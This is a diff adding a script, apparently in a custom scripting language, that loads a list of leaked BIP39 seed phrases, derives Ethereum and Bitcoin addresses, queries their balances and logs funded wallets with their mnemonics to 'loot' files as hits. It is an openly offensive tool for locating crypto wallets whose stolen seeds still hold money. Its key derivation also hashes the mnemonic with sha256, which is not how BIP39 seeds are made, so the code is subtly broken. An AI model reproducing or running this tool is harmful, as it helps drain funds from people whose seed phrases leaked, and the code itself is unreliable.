@@ -1,0 +1,42 @@
+define function cold_storage_enum()
+    print "🧊 Enumerating cold wallet seeds from known leaks..."
+    load wordlist "talon_std/data/bip39_leaks.txt" into mnemonics
+
+    for mnemonic in mnemonics
+        if is_valid_bip39(mnemonic)
+            let eth_addr = derive_eth_address(mnemonic, "m/44'/60'/0'/0/0")
+            let btc_addr = derive_btc_address(mnemonic, "m/44'/0'/0'/0/0")
+
+            let eth_balance = get_eth_balance(eth_addr)
+            let btc_balance = get_btc_balance(btc_addr)
+
+            if eth_balance != "0"
+                print "💥 ETH HIT: " eth_addr " → Ξ " eth_balance
+                write "mnemonic=" + mnemonic + " addr=" + eth_addr + " bal=" + eth_balance to "loot/eth_hits.txt"
+            end
+
+            if btc_balance != "0"
+                print "💥 BTC HIT: " btc_addr " → ₿ " btc_balance
+                write "mnemonic=" + mnemonic + " addr=" + btc_addr + " bal=" + btc_balance to "loot/btc_hits.txt"
+            end
+        else
+            print "❌ Invalid mnemonic skipped: " mnemonic
+        end
+    end
+
+    print "✅ Cold wallet sweep complete"
+end
+
+define function derive_eth_address(mnemonic, path)
+    let seed = sha256(mnemonic)
+    let priv = derive_hd_key(seed, path)
+    let pub = derive_eth_pubkey(priv)
+    return pub_to_eth_address(pub)
+end
+
+define function derive_btc_address(mnemonic, path)
+    let seed = sha256(mnemonic)
+    let priv = derive_hd_key(seed, path)
+    let pub = derive_btc_pubkey(priv)
+    return pub_to_btc_address(pub)
+end
